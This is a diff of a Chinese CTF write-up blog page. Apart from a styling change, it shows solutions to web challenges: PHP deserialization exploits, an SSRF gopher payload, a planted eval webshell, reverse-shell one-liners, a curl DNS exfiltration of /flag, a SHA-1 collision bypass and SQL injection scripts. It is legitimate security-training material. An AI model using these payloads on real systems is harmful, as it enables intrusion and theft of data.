@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -240,13 +248,13 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：4 个月前
+                  本文最后更新于：5 个月前
                 
               </p>
             
             <div class="markdown-body">
               <h2 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h2><p>这道不是极客大挑战的，就写这里吧</p>
-<div class="hljs"><pre><code class="hljs php">&lt;html&gt;
+<pre><code class="hljs php">&lt;html&gt;
 &lt;!--<span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">&#x27;mode&#x27;</span>]!=<span class="hljs-string">&quot;begin&quot;</span>)&#123;
     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Welcome PHP Games!&quot;</span>);
 &#125;--&gt;
@@ -296,11 +304,11 @@ error_reporting(<span class="hljs-number">0</span>);
         &#125;
     &#125;
 &#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 
 
 <p>主要是最后一关<br>exp:</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">last_task</span></span>&#123;
     <span class="hljs-keyword">var</span> $left;
     <span class="hljs-keyword">var</span> $middle;
@@ -310,9 +318,9 @@ $a=<span class="hljs-keyword">new</span> last_task();
 $a-&gt;left=&amp;$a-&gt;middle;
 $a-&gt;right=&amp;$a-&gt;left;
 <span class="hljs-keyword">echo</span> serialize($a);
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p>取地址<code>&amp;</code>符号可太行了，我怎么想不到呢。。。。。。。。</p>
-<h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+<h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;
     <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_JiaRan = <span class="hljs-literal">false</span>;
     <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_AFKL = <span class="hljs-literal">false</span>;
@@ -360,10 +368,10 @@ $a-&gt;right=&amp;$a-&gt;left;
     unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));
 &#125; <span class="hljs-keyword">else</span> &#123;
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;</code></pre></div>
+&#125;</code></pre>
 <p>一道反序列化，值得注意的是，static变量不能被反序列化<br>所以在写exp时就不能带<code>class a</code>了</p>
 <p>exp:</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;
     <span class="hljs-keyword">private</span> $i_want_2_listen_2_MaoZhongDu;
     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span>
@@ -407,12 +415,12 @@ $e = <span class="hljs-keyword">new</span> e();
 $e-&gt;afkl = $d;
 
 
-<span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize([$c,$e]))).<span class="hljs-string">&quot;\n&quot;</span>;</code></pre></div>
+<span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize([$c,$e]))).<span class="hljs-string">&quot;\n&quot;</span>;</code></pre>
 <p>最后将c和e作为一个数组进行序列化，也就是这里是两个入口，以前做的反序列化都是找一个入口，然后一步一步推，原来还可以两个一起，属实是学废了</p>
 <p>还有就是关于反弹shell，我一开始弹，端口在阿里云也开了，就是弹不出来，甚至怀疑自己买了假的服务器，之后突然想到服务器上安了宝塔，看了一眼，果然，宝塔的防火墙端口没开，打开就弹出来了，wssb</p>
 <p>dnslog带出<code>curl `cat /flag|base64`.xxxxxx.dnslog.cn</code></p>
 <h2 id="期末不挂科就算成功"><a href="#期末不挂科就算成功" class="headerlink" title="期末不挂科就算成功"></a>期末不挂科就算成功</h2><p><img src="https://s3.bmp.ovh/imgs/2021/11/a087dd443ee23e03.png" srcset="/img/loading.gif"><br>注释中发现<code>/debug.php</code><br>进入后是用文件包含，伪协议读取下<code>index.php</code><br>额外信息：</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&#x27;url&#x27;</span>]);
 <span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
@@ -421,24 +429,24 @@ curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);
 curl_exec($ch);
 curl_close($ch);
 <span class="hljs-comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span>
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p>在<code>172.17.0.7</code>中除了先前有的还出现了一张图片，应该就是这里了，然后就不会了。<br>看WP要<code>gopher</code>协议<code>post</code></p>
-<div class="hljs"><pre><code>POST /index.php HTTP/1.1
+<pre><code>POST /index.php HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 36
 
-name=admin&amp;password=123456&amp;result=60</code></pre></div>
+name=admin&amp;password=123456&amp;result=60</code></pre>
 <p>进行两次url编码，然后开头加上<code>gopher://172.17.0.7:80/_</code></p>
 <p>值得注意的是，直接两次url编码每行的末尾是<code>%250a</code>也就是只有一个换行符，改成<code>%250D%250A</code>-换行回车</p>
 <p>payload：<code>http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Aname%253Dadmin%2526password%253D123456%2526result%253D60%250d%250A</code></p>
 <h2 id="成全"><a href="#成全" class="headerlink" title="成全"></a>成全</h2><p><code>ThinkPHP v5.0.12</code><br>报错出现了<code>debug</code>界面<br><img src="https://s3.bmp.ovh/imgs/2021/11/24dded7c8682ffb6.png" srcset="/img/loading.gif"></p>
 <p>tp的默认日志文件形式为<code>/202110/11.log</code>文件夹为年加月，文件为日</p>
 <p>对月(1-12)和天(1-31)进行交集爆破<br><img src="https://s3.bmp.ovh/imgs/2021/11/c912d29924a29513.png" srcset="/img/loading.gif"><br>结果<br><img src="https://s3.bmp.ovh/imgs/2021/11/d23301543298d305.png" srcset="/img/loading.gif"><br>在第一个日志中有写好的一句话</p>
-<div class="hljs"><pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);
-phpinfo(); ?&gt;</code></pre></div>
+<pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);
+phpinfo(); ?&gt;</code></pre>
 <p>然后通过shell读取flag</p>
-<h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+<h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;
     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
 <span class="hljs-function">    </span>&#123;
@@ -481,11 +489,11 @@ phpinfo(); ?&gt;</code></pre></div>
     unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));
 &#125; <span class="hljs-keyword">else</span> &#123;
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;</code></pre></div>
+&#125;</code></pre>
 
 
 <p>exp:</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
 <span class="hljs-class"></span>&#123;
     <span class="hljs-keyword">public</span> $test;
@@ -530,11 +538,11 @@ $c = <span class="hljs-keyword">new</span> c(
 );
 $c-&gt;setB([$c, <span class="hljs-string">&quot;eval&quot;</span>]);
 $exp = <span class="hljs-keyword">new</span> a($c);
-<span class="hljs-keyword">echo</span> base64_encode(serialize($exp));</code></pre></div>
+<span class="hljs-keyword">echo</span> base64_encode(serialize($exp));</code></pre>
 
 
 <p>执行流程：</p>
-<div class="hljs"><pre><code>class a的test=new c(),调用c的test(),c继承于b,
+<pre><code>class a的test=new c(),调用c的test(),c继承于b,
 会先调d的test(),而b中的$b被设为[$c, &quot;eval&quot;],
 然后就会调用c的eval()函数，而$this-&gt;call=[new d(&quot;system&quot;), &quot;eval&quot;],
 $this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;call)($this-&gt;value)
@@ -542,17 +550,17 @@ $this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;c
 第一次进入到d中，d的$this-&gt;value=system,$call=[new d(&quot;whoami&quot;), &quot;eval&quot;];
 $call($this-&gt;value)就成了[new d(&quot;whoami&quot;), &quot;eval&quot;] (&quot;system&quot;)
 第二次进入d中,d的$this-&gt;value=whoami,$call=system,
-$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre></div>
+$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre>
 <p>关于为啥<code>[$c, &quot;eval&quot;]</code>就能执行<code>c</code>的<code>eval</code>函数</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;
+<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;
     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"></span>)</span>&#123;
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123&quot;</span>;
     &#125;
 &#125;
-$dd=[<span class="hljs-keyword">new</span> aa(),<span class="hljs-string">&quot;fun&quot;</span>]();     <span class="hljs-comment">//输出 123      [&quot;aa&quot;,&quot;fun&quot;]()这样也可以</span></code></pre></div>
+$dd=[<span class="hljs-keyword">new</span> aa(),<span class="hljs-string">&quot;fun&quot;</span>]();     <span class="hljs-comment">//输出 123      [&quot;aa&quot;,&quot;fun&quot;]()这样也可以</span></code></pre>
 <p>还有就是<code>([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;])</code>这个，后面的<code>[new d(&quot;whoami&quot;), &quot;eval&quot;]</code>被当作eval的参数传进去了</p>
 <p>看一个简单的</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;
     <span class="hljs-keyword">public</span> $c1;
     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$qq</span>)</span>&#123;
@@ -566,16 +574,16 @@ $dd=[<span class="hljs-keyword">new</span> aa(),<span class="hljs-string">&quot;
         var_dump($aadd);
     &#125;
 &#125;
-$b=<span class="hljs-keyword">new</span> aa([<span class="hljs-keyword">new</span> bb(),<span class="hljs-string">&quot;fun&quot;</span>]([<span class="hljs-string">&quot;123&quot;</span>]));</code></pre></div>
+$b=<span class="hljs-keyword">new</span> aa([<span class="hljs-keyword">new</span> bb(),<span class="hljs-string">&quot;fun&quot;</span>]([<span class="hljs-string">&quot;123&quot;</span>]));</code></pre>
 <p>输出</p>
-<div class="hljs"><pre><code>34
+<pre><code>34
 array(1) &#123;
 [0]=&gt;
 string(3) &quot;123&quot;
-&#125;</code></pre></div>
+&#125;</code></pre>
 <p>所以在一个数组中，<code>[new a(),&quot;fff&quot;]()</code>就相当于<code>new a()-&gt;ff()</code>,当然，后面的<code>()</code>里也可以加参数，如果需要的话</p>
 <p><code>php是世界上最好的语言✔（￣︶￣）↗　</code></p>
-<h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+<h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">chijou_kega_no_junnka</span>(<span class="hljs-params">$str</span>) </span>&#123;
     $black_list = [<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot; &quot;</span>];
     <span class="hljs-keyword">return</span> str_replace($black_list, <span class="hljs-string">&quot;&quot;</span>, $str);
@@ -588,7 +596,7 @@ string(3) &quot;123&quot;
     exec(<span class="hljs-string">&quot;bash -c \&quot;bash -i &lt; /dev/tcp/<span class="hljs-subst">$addr</span>/<span class="hljs-subst">$port</span>\&quot;&quot;</span>);
 &#125; <span class="hljs-keyword">else</span> &#123;
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;</code></pre></div>
+&#125;</code></pre>
 
 <p>反弹shell，但是是个无回显的shell,可以无回显shell中执行反弹shell命令，再次反弹到VPS的另一个端口</p>
 <p><code>bash -i &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></p>
@@ -602,7 +610,7 @@ string(3) &quot;123&quot;
 </ul>
 <p><code>nc -lvnp 2233 &gt; /var/flag.png</code></p>
 <h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>第一关：</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PHP is the best Language &lt;br/&gt;&quot;</span>;
+<pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PHP is the best Language &lt;br/&gt;&quot;</span>;
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have you ever heard about PHP Black Magic&lt;br/&gt;&quot;</span>;
 error_reporting(<span class="hljs-number">0</span>);
 $temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];
@@ -617,10 +625,10 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <span class="hljs-comment">//why not they use their vps !!!</span>
 <span class="hljs-comment">//BBTZ le jiarenmen</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p><code>/?password=10000a</code></p>
 <p>第二关：</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 error_reporting(<span class="hljs-number">0</span>);
 
 $flag=getenv(<span class="hljs-string">&#x27;flag&#x27;</span>);
@@ -636,9 +644,9 @@ $flag=getenv(<span class="hljs-string">&#x27;flag&#x27;</span>);
 <span class="hljs-keyword">else</span>
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just g1ve it a try.&#x27;</span>;
 highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p><code>/baby_magic.php?user[]=1&amp;pass[]=2</code><br>第三关：</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 error_reporting(<span class="hljs-number">0</span>);
 
 $flag=getenv(<span class="hljs-string">&#x27;fllag&#x27;</span>);
@@ -657,21 +665,21 @@ $flag=getenv(<span class="hljs-string">&#x27;fllag&#x27;</span>);
 &#125;<span class="hljs-keyword">else</span>
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just G1ve it a try.&#x27;</span>;
 highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p>sha1哈希碰撞</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> urllib.request
 rotimi = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-1.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>];
 letmein = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-2.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>];
  
 r = requests.get(<span class="hljs-string">&#x27;http://tc.rigelx.top:8003/baby_revenge.php&#x27;</span>, params=&#123;<span class="hljs-string">&#x27;user&#x27;</span>: rotimi, <span class="hljs-string">&#x27;pass&#x27;</span>: letmein&#125;);
 print(r.text)
-<span class="hljs-comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre></div>
+<span class="hljs-comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre>
 
 <p>或者：<br>    ?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>
-<div class="hljs"><pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre></div>
+<pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre>
 <p>第四关：</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 $flag=getenv(<span class="hljs-string">&#x27;flllllllllag&#x27;</span>);
 <span class="hljs-keyword">if</span>(strstr(<span class="hljs-string">&quot;Longlone&quot;</span>,$_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;
   <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no!&lt;br&gt;&quot;</span>);
@@ -685,9 +693,9 @@ $_GET[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode($_GET[<span c
   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag: <span class="hljs-subst">$flag</span>&quot;</span>;
 &#125;
 highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p>url编码脚本</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 $string = <span class="hljs-string">&#x27;Longlone&#x27;</span>; <span class="hljs-comment">//需要二次编码的字符或字符串</span>
 $result = <span class="hljs-string">&#x27;&#x27;</span>;
 <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($string);$i++)&#123;
@@ -705,43 +713,43 @@ $result = <span class="hljs-string">&#x27;&#x27;</span>;
     &#125;
 &#125;
 <span class="hljs-keyword">echo</span> $result;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p>payload:<code>?id=%4%43%6%46%6%45%6%37%6%43%6%46%6%45%6%35</code></p>
 <h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111302157152.png" srcset="/img/loading.gif"><br><code>floor报错注入</code><br>payload:<br>注库：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(schema_name) from information_schema.schemata),60))))a from information_schema.tables group by a)b#</code></p>
-<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
+<pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre>
 <p>注表：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;true____flag&#39;),60))))a from information_schema.tables group by a)b#</code></p>
-<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
+<pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre>
 <p>注列：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;syclover&#39;),60))))a from information_schema.tables group by a)b#</code></p>
-<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
+<pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre>
 <p>flag:<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(flag) from true____flag.syclover),60))))a from information_schema.tables group by a)b#</code></p>
-<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
+<pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre>
 <p><code>right函数</code></p>
-<div class="hljs"><pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);
+<pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);
 +------------------+
 | RIGHT(&#39;MySQL&#39;,3) |
 +------------------+
 | SQL              |
 +------------------+
-1 row in set (0.00 sec)</code></pre></div>
+1 row in set (0.00 sec)</code></pre>
 <p><code>left函数</code></p>
-<div class="hljs"><pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);
+<pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);
 +-----------------------+
 | LEFT(&#39;MySQL LEFT&#39;, 5) |
 +-----------------------+
 | MySQL                 |
 +-----------------------+
-1 row in set</code></pre></div>
+1 row in set</code></pre>
 <p><code>mid函数</code>—–和substr差不多</p>
-<div class="hljs"><pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);
+<pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);
 +-------------------+
 | mid(&#39;adbdab&#39;,3,2) |
 +-------------------+
 | bd                |
 +-------------------+
-1 row in set (0.01 sec)</code></pre></div>
+1 row in set (0.01 sec)</code></pre>
 <p>substr被过了就用上面三个代替</p>
 <h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>bool盲注</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> string
 
 url=<span class="hljs-string">&#x27;http://47.100.242.70:4725/check.php&#x27;</span>
@@ -760,9 +768,9 @@ res=<span class="hljs-string">&#x27;&#x27;</span>
         <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> r.text:
             res+=s
             print(res)
-            <span class="hljs-keyword">break</span></code></pre></div>
+            <span class="hljs-keyword">break</span></code></pre>
 <p>空格过了用<code>()</code>,<code>substr</code>被过用<code>mid</code></p>
-<h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;
     <span class="hljs-keyword">public</span> $par0;
@@ -809,22 +817,22 @@ res=<span class="hljs-string">&#x27;&#x27;</span>
 &#125;
 highlight_file(<span class="hljs-keyword">__FILE__</span>);
 $hack = $_GET[<span class="hljs-string">&#x27;hack&#x27;</span>];
